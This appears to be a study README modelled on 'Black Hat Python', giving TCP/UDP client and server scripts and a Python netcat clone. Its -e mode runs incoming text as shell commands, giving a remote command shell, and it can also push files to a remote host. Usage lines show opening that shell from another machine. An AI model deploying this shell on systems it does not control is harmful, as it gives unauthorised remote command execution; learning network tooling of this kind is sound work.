## **BLACK HAT PYTHON 3**

## AUTHORS

Engineer Marcus

## LEGAL DISCLAIMER
This content is not reponsible for any of the actions taken by user or by the reader.     

## **LINCENSE**
     MIT 

## **NETWORK HACKERY**

## **TCP CLIENT**

make a script: tcp_client.py 
```sh 
import socket
target_host = "www.google.com"
target_port = 80

#create a socket object 
client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

#connect to the server

client.connect((target_host,target_port))

#send some data

client.send(b"GET / HTTP/1.1\r\nHost: google.com\r\n\r\n")


#receive some data 
response = client.recv(4096)
print(response.decode())
client.close()

```
**RUN THE SCRIPT**
```sh
python tcp_client.py
```
## **UDP CLIENT** 

make a script: udp_client.py
```sh
import socket

target_host = "127.0.0.1"
target_port = 9997

# Create a socket object
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Send some data
client.sendto(b"AAABBBCCC", (target_host, target_port))

# Receive data
data, addr = client.recvfrom(4096)

print(data.decode())

client.close()
```

**RUN**
```sh
python udp_client.py
```
## **TCP SERVER**

make a script: tcp_server.py
```sh
import socket
import threading 

#set the server ip and port
IP = '0.0.0.0' # 0.0.0.0 listens for connctions from all addresses
PORT = 8080

#build the main function

def main():
   #creating a socket object
   server = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
   # AF_INET tells the server to use ipv4 while the SOCK_STREAM identifies the server as a tcp server

   server.bind((IP, PORT)) # bind the port and ip
   server.listen(5) # listen for incoming connections, maximum 5

   print(f'[*] server listening at:  {IP}:{PORT}')

   
   while True:
      client, address = server.accept() # accept incoming connections
      print(f'[*] accepted a connection with: {address[0]}:{address[0]}')

      # handle client connections with a thread for handling many requests simultaniously
      client_handler = threading.Thread(target=handle_client, args=(client,))
       
      # start the client handler
      client_handler.start()

# build a function to handle client requests
def handle_client(client_socket):
   with client_socket as sock:
      request = sock.recv(1024)
      print(f'[*] received: {request.decode("utf-8")}')
      sock.send(b'life is good')

if __name__=='__main__':
   main()
   
  
```
## **REPLACING NETCAT**

make a script, netcat.py
```sh
import argparse
import socket
import threading
import subprocess
import sys
import os

def handle_client(client_socket, execute):
    """Handles client communication, optionally executing commands."""
    if execute:
        while True:
            try:
                client_socket.send(b"Shell> ")
                cmd = client_socket.recv(1024).decode().strip()
                if cmd.lower() in ["exit", "quit"]:
                    break
                if cmd:
                    output = subprocess.run(cmd, shell=True, capture_output=True)
                    response = output.stdout if output.stdout else output.stderr
                    client_socket.send(response)
            except:
                break
    else:
        while True:
            try:
                request = client_socket.recv(4096)
                if not request:
                    break
                print(request.decode(), end="")
            except:
                break
    client_socket.close()

def start_listener(port, execute):
    """Starts a TCP server to listen for incoming connections."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", port))
    server.listen(5)
    print(f"[+] Listening on port {port}...")

    while True:
        client, addr = server.accept()
        print(f"[+] Connection received from {addr[0]}:{addr[1]}")
        client_handler = threading.Thread(target=handle_client, args=(client, execute))
        client_handler.start()

def connect_to_server(target, port, upload_file):
    """Connects to a Netcat server."""
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target, port))

    if upload_file:
        with open(upload_file, "rb") as f:
            data = f.read()
            client.send(data)
        print(f"[+] File '{upload_file}' sent successfully.")
    else:
        try:
            while True:
                response = client.recv(4096).decode()
                sys.stdout.write(response)
                sys.stdout.flush()
                cmd = input()
                client.send(cmd.encode() + b"\n")
        except:
            print("\n[!] Connection closed.")
            client.close()

def main():
    parser = argparse.ArgumentParser(description="Netcat Clone in Python")
    parser.add_argument("-l", "--listen", action="store_true", help="Start in listening mode (server).")
    parser.add_argument("-p", "--port", type=int, help="Port to listen on or connect to.")
    parser.add_argument("-e", "--execute", action="store_true", help="Execute remote commands (reverse shell).")
    parser.add_argument("-u", "--upload", metavar="FILE", help="Upload a file to the target.")
    parser.add_argument("target", nargs="?", help="Target IP address (for client mode).")

    args = parser.parse_args()

    if args.listen and args.port:
        start_listener(args.port, args.execute)
    elif args.target and args.port:
        connect_to_server(args.target, args.port, args.upload)
    else:
        parser.print_help()
        sys.exit(1)

if __name__ == "__main__":
    main()
```

## **🚀 Usage**

**Start a Listener (Server Mode)**

To listen for incoming connections on a specific port:
```sh
python netcat.py -l -p 4444
```

✅ This will wait for incoming connections on port 4444.

**Connect to a Server (Client Mode)**

To connect to a running Netcat server:
```sh
python netcat.py 192.168.1.100 4444
```

✅ Connects to a Netcat server at 192.168.1.100:4444.

**Reverse Shell (Execute Commands Remotely)**

To start a reverse shell, run the server in execution mode:
```sh
python netcat.py -l -p 4444 -e
```

Then, from another machine, connect as a client:
```sh
python netcat.py 192.168.1.100 4444
```

✅ The client can now run commands on the server's machine.

## **File Transfer**

📤 Send a file to a remote machine:

```sh
python netcat.py 192.168.1.100 4444 -u myfile.txt
```
Sends myfile.txt to the connected server.


---

## 🛠️ **Future Enhancements**

🔒 **Encryption** (AES or RSA for secure communication)

📡 **UDP Mode** (for faster data transfer)

🌐 **Port Scanning** (like Nmap)


